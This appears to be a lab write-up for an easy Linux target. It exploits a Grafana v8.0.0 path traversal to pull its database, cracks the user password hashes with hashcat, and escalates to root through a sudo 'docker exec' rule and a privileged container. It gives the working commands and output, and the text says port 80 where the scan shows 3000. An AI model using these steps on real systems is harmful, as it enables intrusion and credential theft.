



## Lab Details
- Difficulty: Easy
- OS: Linux

## Summary
- Initial access: Outdated Grafana Application
- Privilege escalation: Excessive access via Docker

## Enumeration
#### Steps
- run `nmap`
```
$ nmap 10.129.164.254 -p- -sC -sV -A
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-08 00:23 EDT
Nmap scan report for 10.129.164.254
Host is up (0.0022s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 63:47:0a:81:ad:0f:78:07:46:4b:15:52:4a:4d:1e:39 (RSA)
|   256 7d:a9:ac:fa:01:e8:dd:09:90:40:48:ec:dd:f3:08:be (ECDSA)
|_  256 91:33:2d:1a:81:87:1a:84:d3:b9:0b:23:23:3d:19:4b (ED25519)
3000/tcp open  http    Grafana http
| http-title: Grafana
|_Requested resource was /login
|_http-trane-info: Problem with XML parsing of /evox/about
| http-robots.txt: 1 disallowed entry 
|_/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- Visit `Grafana` running on port 80 
![[Pasted image 20260608134313.png]]
- Identified the version is `v8.0.0`
## Foothold

#### Steps
- Search online and found the version is vulnerable to LFI and file traversal https://www.exploit-db.com/exploits/50581
- Search online and found POC https://github.com/STK-Security/Grafana-Password-Decryptor
- According to the POC, first we will need to fetch the `grafana.db` file from target
```
$ curl 'http://10.129.164.254:3000/public/plugins/zipkin/../../../../../../../../var/lib/grafana/grafana.db' \
  --path-as-is --output grafana.db
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100 584.0k 100 584.0k   0      0 279.7k      0   00:02   00:02         282.3k
```
- Then retrieve password hashes
- There was no data in the `data_source` table 
- Found two hashes in the `user` table
![[Pasted image 20260608134554.png]]
- Save the hashes with their salt into a file
```
$ cat hashes
7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8,YObSoLj55S
dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8,LCBhdtJWjl
```
- Convert the hashes into hashcat format
```
$ python3 grafana2hashcat.py hashes -o hashcat_hashes.txt


[+] Grafana2Hashcat
[+] Reading Grafana hashes from:  hashes
[+] Done! Read 2 hashes in total.
[+] Converting hashes...
[+] Converting hashes complete.
[+] Writing output to 'hashcat_hashes.txt' file.
[+] Now, you can run Hashcat with the following command, for example:

hashcat -m 10900 hashcat_hashes.txt --wordlist wordlist.txt
```
- Attempt to crack the hashes using hashcat
```
$ hashcat -m 10900 hashcat_hashes.txt  /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting
<SNIP>
sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=:beautiful1
<SNIP>
```
## Lateral Movement 

#### Steps

## Privilege Escalation

#### Steps
- Use the password to login to target via ssh as `boris`, username was discovered in the `grafana.db` file
- Run `sudo -l`, user is able to run `docker exec *` as root without password
```
boris@data:~$ sudo -l
Matching Defaults entries for boris on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User boris may run the following commands on localhost:
    (root) NOPASSWD: /snap/bin/docker exec *
```
- Enumerate for running docker containers and found one running
```
boris@data:/$ grep -h -o -E '/docker/[a-f0-9]{64}' /proc/*/cgroup 2>/dev/null | cut -d'/' -f3 | sort -u
e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81
```
- Create a root shell in the docker container and mount the root of the file system 
```
boris@data:/$ sudo docker exec -u root --privileged -it e6ff5b1cbc85 bash
bash-5.1# mount /dev/sda1 /mnt
bash-5.1#  ls -la /mnt/root/root.txt
-rw-r-----    1 root     root            33 Jun  8 04:22 /mnt/root/root.txt
```

## Lessons Learned
- Attack family:
- Key takeaway:

## Resources
- References: